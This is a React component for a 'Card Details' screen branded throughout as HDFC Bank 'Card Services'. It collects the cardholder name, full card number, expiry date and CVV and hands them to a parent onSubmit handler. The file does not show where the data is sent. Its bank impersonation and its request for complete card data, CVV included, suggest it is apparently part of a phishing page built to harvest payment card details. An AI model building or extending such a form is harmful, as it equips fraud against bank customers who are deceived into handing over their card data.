import React, { useState } from 'react';
import { ArrowLeft, ArrowRight } from 'lucide-react';
import logo from '../assets/logo.png';

export default function CardDetailsScreen({ onBack, onSubmit }) {
  const [nameOnCard, setNameOnCard] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (onSubmit) {
      onSubmit({
        nameOnCard,
        cardNumber,
        expiryDate,
        cvv
      });
    }
  };

  return (
    <div className="home-screen-padding">
      <div className="home-white-card">
        {/* Brand Header with HDFC Bank Logo */}
        <div className="home-bank-header">
          <div className="brand-icon-box">
            <img src={logo} alt="HDFC Bank Logo" />
          </div>
          <div className="brand-text-group">
            <h1>HDFC Bank</h1>
            <span>CARD SERVICES</span>
          </div>
        </div>

        {/* Sub-Header: Back Circle + Card Details Title */}
        <div className="details-header" style={{ marginTop: '0.2rem' }}>
          <div className="details-header-left">
            <button className="details-back-circle" onClick={onBack} title="Back">
              <ArrowLeft size={22} strokeWidth={2.5} />
            </button>
            <h2>Card Details</h2>
          </div>
        </div>

        {/* Inner Light Blue Form Card */}
        <form onSubmit={handleSubmit} className="details-form-container">
          {/* Field 1: Name on Card */}
          <div className="details-field">
            <label>NAME ON CARD</label>
            <input
              type="text"
              className="details-pill-input"
              placeholder="Enter name as on card"
              value={nameOnCard}
              onChange={(e) => setNameOnCard(e.target.value)}
              required
            />
          </div>

          {/* Field 2: Card Number */}
          <div className="details-field">
            <label>CARD NUMBER</label>
            <input
              type="text"
              className="details-pill-input"
              placeholder="16-digit card number"
              maxLength={19}
              value={cardNumber}
              onChange={(e) => setCardNumber(e.target.value)}
              required
            />
          </div>

          {/* Field 3 & 4: Expiry Date and CVV Side by Side */}
          <div className="details-row-2col">
            <div className="details-field">
              <label>EXPIRY DATE</label>
              <input
                type="text"
                className="details-pill-input"
                placeholder="MM/YY"
                maxLength={5}
                value={expiryDate}
                onChange={(e) => setExpiryDate(e.target.value)}
                required
              />
            </div>

            <div className="details-field">
              <label>CVV</label>
              <input
                type="password"
                className="details-pill-input"
                placeholder="..."
                maxLength={4}
                value={cvv}
                onChange={(e) => setCvv(e.target.value)}
                required
              />
            </div>
          </div>

          {/* Action Button: Submit -> */}
          <button type="submit" className="btn-next-pill">
            <span>Submit</span>
            <ArrowRight size={20} strokeWidth={2.5} />
          </button>
        </form>

        {/* Footer */}
        <div className="home-card-footer">
          <img src={logo} alt="HDFC" className="footer-logo-img" />
          <span><strong>HDFC Bank</strong> · Secure & Mobile Friendly</span>
        </div>
      </div>
    </div>
  );
}
